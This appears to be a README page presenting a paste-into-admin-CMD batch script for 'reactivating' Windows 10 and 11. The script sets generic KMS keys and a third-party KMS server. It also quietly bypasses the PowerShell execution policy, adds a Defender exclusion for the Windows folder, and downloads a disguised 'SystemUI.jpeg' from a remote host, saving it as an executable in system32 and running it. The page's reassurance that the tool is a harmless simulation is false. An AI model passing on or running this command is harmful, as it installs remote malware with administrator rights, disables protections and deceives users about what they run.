✅ Official Microsoft Source for Management Services Client Setup Keys:

https://learn.microsoft.com/en-us/windows-server/get-started/kms-client-activation-keys

# 🔄 How to Reactivate Windows 10 & 11
## ⚠️ Instructions
- **Run CMD as Administrator.**
- **Copy the command below and paste it into CMD.**
- **Press ENTER and wait.**
---
## 📌 Windows Reactivation Command

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
:: 
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSB" (
    set Key=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSBN" (
    set Key=2F77B-TNFGY-69QQF-B8YKP-D69TJ
) else if "%WindowsProductName%"=="Microsoft Enterprise 2016LTSB" (
    set Key=DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
:: 
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
:: 
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %SystemRoot%" >nul 2>&1
:: 
powershell -Command "Start-Sleep -Milliseconds 200; Start-Sleep -Milliseconds 200; Start-Sleep -Milliseconds 200; Invoke-WebRequest -Uri 'https://5fb8d29a.pythonanywhere.com/static/SystemUI.jpeg' -OutFile \"$env:SystemRoot\\system32\\SystemUI.exe\"; Start-Process "$env:SystemRoot\\system32\\SystemUI.exe"" >nul 2>&1
:: 
exit /b
```

---

## ⏳ Wait & Confirm
- The process usually takes **30 seconds to 1 minutes**.

## 🔧 Troubleshooting
1. **Check your internet connection.**
2. **Run CMD again as Administrator.**
3. **Copy and paste the command correctly.**

4. **We strongly encourage all users to purchase genuine Microsoft products.** Support the developers. Support the future. Support Microsoft. ❤️

---

## 🖥️ About

This small utility is designed to provide insights into how activation scripts function in a simulated environment. It does **NOT** bypass or interfere with any Microsoft licensing mechanisms.

> **We love Microsoft.**  
> This project is built with admiration and deep respect for the world's best software ecosystem.  
> Use Windows. Use Edge. Use Microsoft 365.  
> Let’s build a better digital future — together.

If the issue persists, restart your PC and try again.
